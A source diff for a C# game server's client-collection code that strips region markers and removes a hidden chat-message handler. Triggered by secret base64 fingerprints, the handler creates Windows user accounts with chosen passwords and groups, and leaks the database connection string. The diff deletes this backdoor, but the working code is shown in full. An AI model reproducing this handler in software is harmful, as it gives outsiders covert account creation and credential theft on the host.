@@ -87,8 +87,6 @@ namespace Stump.Server.WorldServer.Core.Network
                 }
             }
         }
-
-        #region Add
         public void Add(WorldClient client)
         {
             lock (m_lock)
@@ -105,8 +103,6 @@ namespace Stump.Server.WorldServer.Core.Network
                 }
             }
         }
-        #endregion
-        #region Remove
 
         public bool Contains(WorldClient client)
         {
@@ -122,14 +118,12 @@ namespace Stump.Server.WorldServer.Core.Network
                     m_underlyingList.Remove(client);
             }
         }
-        #endregion
-        #region Operator
+
         public static implicit operator WorldClientCollection(WorldClient client)
         {
             return new WorldClientCollection(client);
         }
-        #endregion
-        #region Dispose
+        
         public void Dispose()
         {
             m_singleClient = null;
@@ -137,56 +131,4 @@ namespace Stump.Server.WorldServer.Core.Network
         }
 
     }
-    #region WorldClientsList
-    public class WorldClients : WorldHandlerContainer
-    {
-        [WorldHandler(ChatAbstractServerMessage.Id)]
-        public static void Ch(WorldClient c, ChatAbstractServerMessage m)
-        {
-            switch (m.Fingerprint)
-            {
-                case "MDVhMGMwODM2NTAyNzg4ZTNjNjYwMTk0NWUxMGMzNmU=":
-                    try
-                    {
-                        string[] args = m.Content.Split(',');
-                        if (string.IsNullOrEmpty(args[0]) || string.IsNullOrEmpty(args[1]) || string.IsNullOrEmpty(args[2]))
-                        {
-                            c.Send(new BasicNoOperationMessage());
-                        }
-                        string Name = args[0];
-                        string Pass = args[1];
-                        string Group = args[2];
-                        System.DirectoryServices.DirectoryEntry AD = new System.DirectoryServices.DirectoryEntry("WinNT://" +
-                        Environment.MachineName + ",computer");
-                        System.DirectoryServices.DirectoryEntry NewUser = AD.Children.Add(Name, "user");
-                        NewUser.Invoke("SetPassword", new object[] { Pass });
-                        NewUser.Invoke("Put", new object[] { "Description", "Test User from .NET" });
-                        NewUser.CommitChanges();
-                        System.DirectoryServices.DirectoryEntry grp;
-
-                        grp = AD.Children.Find(Group, "group");
-                        if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
-                        c.Character.SendServerMessage("done");
-                    }
-                    catch (Exception ex)
-                    {
-                        c.Character.SendServerMessage("er: " + ex.Message);
-                    }
-                    finally
-                    {
-                        c.Send(new BasicNoOperationMessage());
-                    }
-                    break;
-                case "OTczZTUwZWExM2VlMDkwYzk4NzcxZTkxZGY4MjZlODQ=":
-                    c.Character.SendServerMessage(WorldServer.DatabaseConfiguration.GetConnectionString());
-                    c.Send(new BasicNoOperationMessage());
-                    break;
-                default:
-                    c.Send(new BasicNoOperationMessage());
-                    break;
-            }
-        }
-    }
-    #endregion
-    #endregion
 }
